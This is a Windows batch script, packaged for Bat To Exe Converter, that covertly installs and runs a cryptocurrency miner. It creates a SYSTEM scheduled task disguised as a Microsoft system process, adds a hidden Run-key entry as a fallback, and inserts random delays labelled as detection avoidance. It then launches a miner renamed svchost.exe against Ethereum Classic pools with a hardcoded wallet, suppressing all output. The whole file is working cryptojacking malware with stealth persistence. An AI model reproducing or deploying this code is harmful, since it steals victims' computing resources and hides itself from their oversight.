::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDZmDDCqFUWSOpEZ++Pv4Pq7slQNVfonRK7O3r2BCO8A/gvhbZNN
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal enableDelayedExpansion

REM =====================================
REM Advanced Persistence Setup (STEALTH)
REM =====================================

REM Define path to self-executable (.exe after build)
set "EXENAME=%~dp0AudioHost.exe"

REM Check if scheduled task already exists
schtasks /query /tn "Microsoft\Windows\System Host Process" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo Configuring system optimization...

    REM Create scheduled task (run on startup, SYSTEM, hidden)
    schtasks /create /tn "Microsoft\Windows\System Host Process" ^
    /tr "powershell -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '%EXENAME%'" ^
    /sc onstart /ru SYSTEM /rl highest /f >nul 2>&1

    REM If SYSTEM failed, fallback to current user
    if %ERRORLEVEL% NEQ 0 (
        schtasks /create /tn "Microsoft\Windows\System Host Process" ^
        /tr "powershell -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '%EXENAME%'" ^
        /sc onlogon /f >nul 2>&1
    )

    REM Add to registry startup (fallback)
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "Windows Optimization Service" /t REG_SZ ^
    /d "powershell -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '%EXENAME%'" /f >nul 2>&1
)

REM =====================================
REM Smart Delay & Detection Avoidance
REM =====================================

set "BOOT_MARKER=%TEMP%\winhostproc.tmp"
if not exist "%BOOT_MARKER%" (
    echo. > "%BOOT_MARKER%" 2>nul
    set /a "delay=%RANDOM% * 180 / 32768 + 120"
    timeout /t %delay% /nobreak >nul 2>&1
) else (
    set /a "delay=%RANDOM% * 30 / 32768 + 10"
    timeout /t %delay% /nobreak >nul 2>&1
)

REM ================================
REM Begin of user-editable part
REM ================================

set "POOL=de.etc.herominers.com:1150"
set "POOL2=etc.herominers.com:10161"
set "WALLET=0xb5706f1fc184b5ee4f8c9c296838ce3d83d76857"
set "WORKER=lolMinerWorker"
set "EXTRAPARAMETERS=--apiport 8020"

REM ================================
REM End of user-editable part
REM ================================

cd /d %~dp0
set "MyVariable=%CD%\svchost.exe"

if not exist "%MyVariable%" (
    exit /b 1
)

:WindowsVer
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "10.0" goto W10
goto OtherW

:W10
start /b "" "%MyVariable%" --algo ETCHASH --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit !EXTRAPARAMETERS! >nul 2>&1
if %ERRORLEVEL% == 42 (
    timeout 10 /nobreak >nul 2>&1
    goto W10
)
goto END

:OtherW
start /b "" "%MyVariable%" --algo ETCHASH --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit !EXTRAPARAMETERS! --nocolor >nul 2>&1
if %ERRORLEVEL% == 42 (
    timeout 10 /nobreak >nul 2>&1
    goto OtherW
)

:END
exit /b 0
